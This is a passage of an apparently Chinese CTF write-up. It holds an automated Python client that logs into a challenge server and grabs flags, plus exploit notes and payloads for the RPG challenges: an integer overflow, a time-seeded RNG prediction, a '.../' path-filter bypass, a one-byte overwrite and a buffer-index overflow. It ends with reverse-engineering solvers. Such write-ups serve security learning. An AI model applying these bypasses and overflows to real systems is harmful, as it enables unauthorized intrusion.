class=\"number\">118</span>, <span class=\"number\">118</span>, <span class=\"number\">32</span>, <span class=\"number\">27</span>, <span class=\"number\">10</span>, <span class=\"number\">60</span>, <span class=\"number\">6</span>, <span class=\"number\">14</span>, <span class=\"number\">20</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">status = <span class=\"number\">0</span></span><br><span class=\"line\">choice = []</span><br><span class=\"line\"><span class=\"keyword\">while</span> status &lt; <span class=\"built_in\">len</span>(stage1key):</span><br><span class=\"line\">    choice.append((status*<span class=\"number\">9</span>)^<span class=\"number\">0x86</span>^stage1key[status])</span><br><span class=\"line\">    status += <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">status = 0</span></span><br><span class=\"line\"><span class=\"string\">while status &lt; len(stage1key):</span></span><br><span class=\"line\"><span class=\"string\">    print(choice[status]^(status*9)^0x86,stage1key[status])</span></span><br><span class=\"line\"><span class=\"string\">    status += 1</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">for c in choice:</span></span><br><span class=\"line\"><span class=\"string\">    print(chr(c))</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getFlag</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> data.find(<span class=\"string\">&#x27;0ops&#x27;</span>)!=-<span class=\"number\">1</span>:</span><br><span class=\"line\">        flag = data[data.find(<span class=\"string\">&#x27;0ops&#x27;</span>):]</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"></span><br><span class=\"line\">ssh = paramiko.SSHClient()</span><br><span class=\"line\"></span><br><span class=\"line\">ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">102400</span></span><br><span class=\"line\">ssh.connect(<span class=\"string\">&#x27;111.186.57.85&#x27;</span>,<span class=\"number\">40150</span>,<span class=\"string\">&#x27;guest&#x27;</span>,<span class=\"string\">&#x27;guest&#x27;</span>)</span><br><span class=\"line\">s = ssh.invoke_shell(width=<span class=\"number\">181</span>,height=<span class=\"number\">58</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">begin</span>():</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    b()</span><br><span class=\"line\">    <span class=\"comment\">#print(dir(s))</span></span><br><span class=\"line\">    <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">        s.send(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">        data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        b()</span><br><span class=\"line\">        <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#print(&#x27;menu&#x27;)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">stage1</span>():</span><br><span class=\"line\">    s.send(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(data[:<span class=\"number\">20</span>],data[-<span class=\"number\">20</span>:])</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(data[:<span class=\"number\">20</span>],data[-<span class=\"number\">20</span>:])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;play stage 1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> choice:</span><br><span class=\"line\">        s.send(c.to_bytes(<span class=\"number\">1</span>,<span class=\"string\">&#x27;big&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(data[:<span class=\"number\">20</span>],data[-<span class=\"number\">20</span>:])</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(data[:<span class=\"number\">20</span>],data[-<span class=\"number\">20</span>:])</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    flag1 = data[data.find(<span class=\"string\">&#x27;0ops&#x27;</span>):]</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(flag1)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(data[:<span class=\"number\">20</span>],data[-<span class=\"number\">20</span>:])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#begin()</span></span><br><span class=\"line\"><span class=\"comment\">#stage1()</span></span><br><span class=\"line\"></span><br><span class=\"line\">f = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./direction.txt&#x27;</span>)</span><br><span class=\"line\">direction = f.read().split(<span class=\"string\">&#x27;,&#x27;</span>)[:-<span class=\"number\">1</span>]</span><br><span class=\"line\">direction = [<span class=\"built_in\">int</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> direction]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(direction)</span><br><span class=\"line\"><span class=\"comment\">#print(direction)</span></span><br><span class=\"line\"><span class=\"comment\">#direction = [0 for i in range(10)]</span></span><br><span class=\"line\"><span class=\"comment\">#f = open(&#x27;direction.pkl&#x27;,&#x27;rb&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#direction = pickle.load(f)</span></span><br><span class=\"line\"><span class=\"comment\">#print(direction)</span></span><br><span class=\"line\">n2d = &#123;<span class=\"number\">0</span>:<span class=\"string\">&#x27;w&#x27;</span>,<span class=\"number\">1</span>:<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"number\">2</span>:<span class=\"string\">&#x27;s&#x27;</span>,<span class=\"number\">3</span>:<span class=\"string\">&#x27;d&#x27;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">isCorrect</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data.find(<span class=\"string\">&#x27;路口&#x27;</span>)!=-<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">stage2</span>():</span><br><span class=\"line\">    </span><br><span class=\"line\">    s.send(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    s.send(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    s.send(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\">    b()</span><br><span class=\"line\">    <span class=\"comment\">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class=\"line\">    <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#print(&#x27;play stage 2&#x27;)</span></span><br><span class=\"line\">    s.send(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    b()</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\">    b()</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\">    b()</span><br><span class=\"line\"></span><br><span class=\"line\">    fail = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    level = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> level &lt; <span class=\"number\">10</span> <span class=\"keyword\">and</span> fail &lt; <span class=\"number\">3</span>:</span><br><span class=\"line\">        <span class=\"comment\">#print(f&#x27;&#123;fail=&#125;&#x27;)</span></span><br><span class=\"line\">        <span class=\"comment\">#print(f&#x27;&#123;level=&#125;,direction=&#123;n2d[direction[level]]&#125;&#x27;)</span></span><br><span class=\"line\">        s.send(n2d[direction[level]])</span><br><span class=\"line\">        b()</span><br><span class=\"line\"></span><br><span class=\"line\">        data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        b()</span><br><span class=\"line\">        <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#print(isCorrect(data))</span></span><br><span class=\"line\">        </span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(isCorrect(data)):</span><br><span class=\"line\">            <span class=\"comment\">#print(f&#x27;d[&#123;level&#125;]=&#123;n2d[direction[level]]&#125;&#x27;)</span></span><br><span class=\"line\">            level+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            fail+=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"comment\">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class=\"line\">            <span class=\"comment\">#print(data)</span></span><br><span class=\"line\">            s.send(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">            b()</span><br><span class=\"line\">            s.recv(n)</span><br><span class=\"line\">            <span class=\"comment\">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class=\"line\">            b()</span><br><span class=\"line\">            <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\">        </span><br><span class=\"line\"></span><br><span class=\"line\">            direction[level] = (direction[level]+<span class=\"number\">1</span>)%<span class=\"number\">4</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(level)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fail &lt; <span class=\"number\">3</span></span><br><span class=\"line\">        </span><br><span class=\"line\">    </span><br><span class=\"line\">begin()</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"keyword\">not</span> stage2():</span><br><span class=\"line\">    <span class=\"comment\">#ssh = paramiko.SSHClient()</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span></span><br><span class=\"line\">    ssh.close()</span><br><span class=\"line\">    ssh.connect(<span class=\"string\">&#x27;111.186.57.85&#x27;</span>,<span class=\"number\">40150</span>,<span class=\"string\">&#x27;guest&#x27;</span>,<span class=\"string\">&#x27;guest&#x27;</span>)</span><br><span class=\"line\">    s = ssh.invoke_shell(width=<span class=\"number\">181</span>,height=<span class=\"number\">58</span>)</span><br><span class=\"line\">    begin()</span><br><span class=\"line\">data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">getFlag(data)</span><br><span class=\"line\">data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">getFlag(data)</span><br><span class=\"line\">data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">getFlag(data)</span><br><span class=\"line\">ssh.close()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"简单的RPG2\"><a href=\"#简单的RPG2\" class=\"headerlink\" title=\"简单的RPG2\"></a>简单的RPG2</h3><p>溢出 cost会变小</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fstream&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> num = (<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">16</span>)/<span class=\"number\">50</span> ;num&lt;=<span class=\"number\">99999999</span>;num++)&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> cost = num*<span class=\"number\">50</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(cost &gt; <span class=\"number\">0</span> &amp;&amp; cost &lt; <span class=\"number\">10000</span>)&#123;</span><br><span class=\"line\">\t\t\tstd::cout&lt;&lt;num&lt;&lt;<span class=\"string\">&quot; &quot;</span>&lt;&lt;cost&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"简单的RPG3\"><a href=\"#简单的RPG3\" class=\"headerlink\" title=\"简单的RPG3\"></a>简单的RPG3</h3><p>随机种子是time&#x2F;10 10s重置一次 且是stage3函数开始的时候，所以只要用另一台时区一致的机器跑一样的代码即可</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">char</span> tab[<span class=\"number\">4</span>]=&#123;<span class=\"string\">&#x27;W&#x27;</span>,<span class=\"string\">&#x27;A&#x27;</span>,<span class=\"string\">&#x27;S&#x27;</span>,<span class=\"string\">&#x27;D&#x27;</span>&#125;;</span><br><span class=\"line\">        <span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>)/<span class=\"number\">10</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span> ;i &lt; <span class=\"number\">10</span> ;i++)&#123;</span><br><span class=\"line\">                std::cout&lt;&lt;tab[<span class=\"built_in\">rand</span>()%<span class=\"number\">4</span>]&lt;&lt;<span class=\"string\">&quot;,&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        std::cout&lt;&lt;std::endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"简单的RPG4\"><a href=\"#简单的RPG4\" class=\"headerlink\" title=\"简单的RPG4\"></a>简单的RPG4</h3><p>ida 逆向</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%48s&quot;</span>,s1);</span><br><span class=\"line\"><span class=\"keyword\">while</span>(<span class=\"built_in\">memcmp</span>(s1,<span class=\"string\">&quot;your_deck/&quot;</span>,<span class=\"number\">0xA</span>uLL));</span><br><span class=\"line\"><span class=\"keyword\">for</span>(dest = s1; <span class=\"built_in\">strcpy</span>(dest,dest+<span class=\"number\">1</span>))&#123;</span><br><span class=\"line\">    dest = <span class=\"built_in\">strstr</span>(dest,<span class=\"string\">&quot;../&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!dest)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>只能用your_deck 且过滤了..&#x2F;<br>但实际上每次过滤之后dest会直接移动一个位置，因此<code>.../</code>会被替换为<code>../</code> 然后找一个攻击力更高的就行了 （前两个byte）</p>\n<h3 id=\"简单的RPG5\"><a href=\"#简单的RPG5\" class=\"headerlink\" title=\"简单的RPG5\"></a>简单的RPG5</h3><p>一个表面上走不通的迷宫<br>两个迷惑的地方</p>\n<ol>\n<li>为什么输入和迷宫数据用的是同一个地址？</li>\n<li>为什么迷宫信息需要用那么复杂的方式？</li>\n</ol>\n<p>分别对应的利用点：</p>\n<ol>\n<li>scanf %s 最后会补\\0 导致覆盖1个byte的数据</li>\n<li>表面上是用一个bit存数据 节省空间 实际上覆盖1个byte的数据足以改变8个迷宫格子 打造一条通路</li>\n</ol>\n<p>exp:<code>wddddddsddddddddssddddwwddssssaassssddssddwwddwwaawwddddwwddwwddddddddssssssddssssaassssddssssssaaaaaaaaaaaaaassssssssssaaaaaassssssssddssssaassssddssddddddddddddddwwddddddddssddddddwwddddddssddddddddwwwwddddssddssddddwwwwwwwwddddssddssssssddddwwddddddddddddddssdd00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></p>\n<h3 id=\"简单的RPG6\"><a href=\"#简单的RPG6\" class=\"headerlink\" title=\"简单的RPG6\"></a>简单的RPG6</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> v12[<span class=\"number\">128</span>];<span class=\"comment\">//[rsp+70h]</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> int8 v13;<span class=\"comment\">//[rsp+F0h]</span></span><br><span class=\"line\"><span class=\"type\">char</span> v14;<span class=\"comment\">//[rsp+F1h]</span></span><br></pre></td></tr></table></figure>\n<p>v12[128] &#x3D;&#x3D; v13<br>v12[129] &#x3D;&#x3D; v14<br>目标是让v13变成129 这样直接拿v14的值比 和随机数无关<br><code>[&gt;&gt;&lt;+]</code>靠[]让v13循环加到127，然后v12[v13]加到溢出到0停止循环<br><code>&gt;+</code>v13加到129<br><code>.</code>让v5是1<br>payload：<code>+[&gt;&gt;&lt;+]&gt;+.</code></p>\n<h2 id=\"REVERSE\"><a href=\"#REVERSE\" class=\"headerlink\" title=\"REVERSE\"></a>REVERSE</h2><h3 id=\"EasyMBA\"><a href=\"#EasyMBA\" class=\"headerlink\" title=\"EasyMBA\"></a>EasyMBA</h3><p>简单位运算的方程<br>由于位运算的高位不会对低位产生影响 所以可以看成是每个bit的方程 这个方程一阶命题逻辑方程，可能多解，也可能无解。多解情况下可以回溯。<br>这里用unsigned int 模拟每个寄存器 然后用运算符翻译一下汇编的指令，模拟之后一个个bit枚举即可。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stack&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">checker1 </span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">2833100173</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">-0x9c68db12=0xc74d27b</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">*/</span> </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">checker2</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//79606647</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> a = <span class=\"number\">0x50994505</span> ;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> b = <span class=\"number\">0x57B0131A</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> ans = ~a-b;</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> x = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span> ;i &lt; <span class=\"number\">32</span>;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(i==<span class=\"number\">8</span>)std::cout&lt;&lt;x&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>((((x&amp;<span class=\"number\">0x5427F672</span>)+(x&amp;<span class=\"number\">0x5427F672</span>)+(x&amp;<span class=\"number\">0x5427F672</span>)+ ~(x | <span class=\"number\">0xABD8098D</span>)+<span class=\"number\">1</span> + ~x+<span class=\"number\">1</span>) &amp; (<span class=\"number\">1</span>&lt;&lt;i))== (ans &amp; (<span class=\"number\">1</span>&lt;&lt;i)))&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\tx |= (<span class=\"number\">1</span>&lt;&lt;i);</span><br><span class=\"line\">\t\t\tstd::cout&lt;&lt;i&lt;&lt;<span class=\"string\">&quot; &quot;</span>&lt;&lt;(ans &amp; (<span class=\"number\">1</span>&lt;&lt;i))&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tstd::cout&lt;&lt;x&lt;&lt;<span class=\"string\">&quot; &quot;</span>&lt;&lt;((x&amp;<span class=\"number\">0x5427F672</span>)+(x&amp;<span class=\"number\">0x5427F672</span>)+(x&amp;<span class=\"number\">0x5427F672</span>)+ ~(x | <span class=\"number\">0xABD8098D</span>)+<span class=\"number\">1</span> + ~x+<span class=\"number\">1</span>)&lt;&lt;<span class=\"string\">&quot; &quot;</span>&lt;&lt;ans&lt;&lt;std::endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">checker3_check</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> x,<span class=\"type\">int</span> i)</span></span>&#123;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> ans = <span class=\"number\">0x2334EB06</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> eax = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> edx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> ecx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax  = ~eax;</span><br><span class=\"line\">\teax |=  <span class=\"number\">0xADFDBC7B</span>;</span><br><span class=\"line\">\tedx = eax;</span><br><span class=\"line\">\teax &lt;&lt;= <span class=\"number\">2</span>;</span><br><span class=\"line\">\tecx = edx;</span><br><span class=\"line\">\tecx -= eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax |= <span class=\"number\">0xADFDBC7B</span>;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\tedx = eax;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\teax += eax;</span><br><span class=\"line\">\teax += edx;</span><br><span class=\"line\">\tedx = eax+ecx;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\teax &amp;= <span class=\"number\">0xADFDBC7B</span>;</span><br><span class=\"line\">\tecx = eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\teax |= <span class=\"number\">0xADFDBC7B</span>;</span><br><span class=\"line\">\teax = eax;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\teax +=eax;</span><br><span class=\"line\">\teax += ecx;</span><br><span class=\"line\">\teax &lt;&lt;= <span class=\"number\">2</span>;</span><br><span class=\"line\">\tedx += eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax ^= <span class=\"number\">0xADFDBC7B</span>;</span><br><span class=\"line\">\tecx = eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax &amp;= <span class=\"number\">0xADFDBC7B</span>;</span><br><span class=\"line\">\teax *= (<span class=\"number\">-0xa</span>);</span><br><span class=\"line\">\teax += ecx;</span><br><span class=\"line\">\tedx -= eax;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (eax &amp; (<span class=\"number\">1</span>&lt;&lt;i)) == (ans &amp; (<span class=\"number\">1</span>&lt;&lt;i));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">checker3</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//84381514</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> x = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span> ;i &lt; <span class=\"number\">32</span> ;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(<span class=\"built_in\">checker3_check</span>(x,i))&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tx |= (<span class=\"number\">1</span>&lt;&lt;i);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(<span class=\"built_in\">checker3_check</span>(x,i))&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\tstd::cout&lt;&lt;<span class=\"string\">&quot;cant find answer&quot;</span>&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tstd::cout&lt;&lt;x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">checker4_check</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> x,<span class=\"type\">int</span> i)</span></span>&#123;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> ans = <span class=\"number\">0xDE2B3E84</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> eax = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> edx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> ecx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> esi = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> edi = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> rdi = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> rsi = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> rax = <span class=\"number\">0</span>;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax ^= <span class=\"number\">0xE76EDA24</span>;</span><br><span class=\"line\">\teax = eax;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\tedx = eax;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\teax &lt;&lt;= <span class=\"number\">2</span>;</span><br><span class=\"line\">\teax +=  edx;</span><br><span class=\"line\">\teax += eax;</span><br><span class=\"line\">\tedx += eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\teax |= <span class=\"number\">0xE76EDA24</span>;</span><br><span class=\"line\">\teax = eax;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\teax &lt;&lt;= <span class=\"number\">2</span>;</span><br><span class=\"line\">\tecx = edx + eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax 